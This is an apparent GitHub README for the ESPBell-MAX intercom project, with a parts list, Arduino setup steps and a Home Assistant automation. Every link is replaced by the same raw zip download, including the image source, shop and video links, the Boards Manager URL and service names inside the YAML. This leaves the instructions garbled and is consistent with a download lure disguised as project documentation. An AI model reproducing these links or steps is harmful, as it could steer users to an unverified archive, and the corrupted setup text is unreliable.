<img src="https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip"/>

🤗 Please consider subscribing to my [YouTube channel](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)
Your subscription goes a long way in backing my work.


[![ko-fi](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)


# ESPBell-MAX and [ESPBell-LITE](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)
...
> [!NOTE]
>  If you're ready to contribute to the project, your support would be greatly appreciated. Due to time constraints, I may not be able to quickly verify new "features" or completely new "code" functionality. Therefore, please refrain from making changes to the original code. Instead, create a new code/script in the 'Contributors_code' folder and use this [https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip) Thank you very much!
____________

### Links

- YouTube video [How To](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)
- My Shop
  - [ESPBell-MAX](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)
  - [UNIProg Programmer](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip)
- Aliexpress
  - Pogo pin Clamp Fixture
    - https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
  - Battery
    - https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
    - https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
  - Charger
  ...
  - Vis and Insert "Optional for 3D Case"
    - 3 x Vis M2 4mm - https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
    - 3 x Insert M2(OD 3.2mm) - https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
...
> [!NOTE]
> ✅ Please [check your Intercom type.](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip) It needs to be a 5-wire intercom system.
> I hope that everything is crystal clear as I've made every effort to provide a step-by-step explanation of the setup process. If you have any further questions regarding the setup or require assistance with assembling a printed circuit board, feel free to join our [Facebook Group](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip) or open a new [discussion](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip) topic in the dedicated tab.
...
- Enter `https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip` into the “Additional Boards Manager URLs” field. Then, click the “OK” button
...
> [!NOTE]
> For `https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip`
...
- Regular USB-TTL 3.3v adapter. I have [open-source USB-TTL](https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip) project, in case you don’t have a TTL adapter yet and want to assemble it yourself.
...
```yaml
  image: https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
- service: https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
- service: https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip
...
Trigger: The trigger specifies the event or condition that will start the automation. In this case, it is triggered when the state of the "https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip" changes to "on." This implies that the automation will run when the binary sensor named "espbell_max_bell" switches from an off state to an on state.
...
The first action uses the "https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip" service to send a notification with the message "clear_notification." It also includes data attributes with the "tag" set to "intercom." This effectively clears or dismisses the notification with the "intercom" tag on the "mobile_app_doogee_v20pro" mobile app.

The second action is identical to the first but uses the "https://github.com/OlegBON1/ESPBell-MAX/raw/refs/heads/main/Code/Bell_MAX_ESP_v3.5.zip" service to clear or dismiss the notification on another mobile device with the "intercom" tag.
